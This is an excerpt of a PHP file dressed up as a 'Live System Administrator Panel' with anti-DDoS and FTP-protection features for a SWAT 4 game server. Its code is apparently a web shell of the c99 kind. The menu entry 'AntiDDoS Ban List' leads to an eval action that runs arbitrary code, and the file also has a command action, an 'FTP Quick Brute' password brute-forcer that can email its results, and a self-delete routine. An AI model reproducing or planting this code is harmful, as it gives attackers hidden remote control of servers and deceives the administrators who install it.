...
<html>
<head>
<title>           Live System Administrator Panel</title>
<link href="style.css" rel="stylesheet" type="text/css">
</head>
<body>
<div id="main">
<h1>           Live System Administrator Panel</h1>
<div id="login">
<h2>Your IP has been registrated to database!</h2>
...
*
*  Last modify: 5/9/2015
*
*  © Angel KOS SWAT 4 Server.*
******************************************************************************************************
*/
...
$shver = "1.0 beta (5/9/2015)"; //Current version
...
$accessdeniedmess = "<a href=\"\">SCRIPT v.".$shver."</a>: access denied";
...
$donated_html = "<center><b>Specially for KOS Server</b></center>";
...
$quicklaunch = array(
 ...
 array("<b>FTP Protection Ban</b>",$surl."act=ftpquickProtect&d=%d"),
 array("<b>Sec.</b>",$surl."act=security&d=%d"),
 array("<b>SQL</b>",$surl."act=sql&d=%d"),
 array("<b>AntiDDoS Ban List</b>",$surl."act=eval&d=%d"),
...
if ($login)
{
 ...
 if (($_SERVER["PHP_AUTH_USER"] != $login ) or (md5($_SERVER["PHP_AUTH_PW"]) != $md5_pass))
 {
  ...
  header("WWW-Authenticate: Basic realm=\"cmd ".$shver.": ".$login_txt."\"");
  ...
  if (!empty($submit))
  {
   ...
   else
   {
    if ($fqb_logging)
    {
     ...
     $fqb_log = "FTP Quick Brute (called scriptv. ".$shver.") started at ".date("d.m.Y H:i:s")."\r\n\r\n";
    ...
    if ($fqb_logfp) {fseek($fqb_logfp,0); fwrite($fqb_logfp,$fqb_log,strlen($fqb_log));}
    if ($fqb_logemail) {@mail($fqb_logemail,"scriptv. ".$shver." report",$fqb_log);}
    fclose($fqb_logfp);
   }
  }
  else
...
if ($act == "selfremove")
{
 ...
 {
  if (unlink(__FILE__)) {@ob_clean(); echo "Thanks for using scriptv.".$shver."!"; exit; }
...
if ($act == "feedback")
{
 ...
 if (!empty($submit))
 {
  ...
  $body = "scriptv.".$shver." feedback #".$ticket."\nName: ".htmlspecialchars($fdbk_name)."\nE-mail: ".htmlspecialchars($fdbk_email)."\nMessage:\n".htmlspecialchars($fdbk_body)."\n\nIP: ".$REMOTE_ADDR;
  if (!empty($fdbk_ref))
  {
   $tmp = @ob_get_contents();
   ob_clean();
  ...
  mail($suppmail,"scriptv.".$shver." feedback #".$ticket,$body,"FROM: ".$suppmail);
...
if ($act == "eval")
{
 if (!empty($eval))
 {
  echo "<b>Result of Last Attacks</b>:<br>";
  $tmp = ob_get_contents();
  $olddir = realpath(".");
  @chdir($d);
  if ($tmp)
 ...
 else {echo "<b>Banned IPs List</b>"; if (empty($eval_txt)) {$eval_txt = true;}}
...
<tr><td width="100%" height="1" valign="top" colspan="2"><p align="center"><b>:: <a href="<?php echo $surl; ?>act=cmd&d=<?php echo urlencode($d); ?>"><b>Anti-DDos</b></a> ::</b></p></td></tr>
...
<br><TABLE style="BORDER-COLLAPSE: collapse" height=1 cellSpacing=0 borderColorDark=#666666 cellPadding=0 width="100%" bgColor=#333333 borderColorLight=#c0c0c0 border=1><tr><td width="990" height="1" valign="top"><p align="center"><b>--[ scriptv. <?php echo $shver; ?> <a href="<?php echo $surl; ?>act=about"><u><b>powered by</b></u></a> Angel Security Team | <a href="http://knightofsorrow.tk"><font color="#FF0000">OVH</font></a><font color="#FF0000"></font> | Generation time: <?php echo round(getmicrotime()-starttime,4); ?> ]--</b></p></td></tr></table>
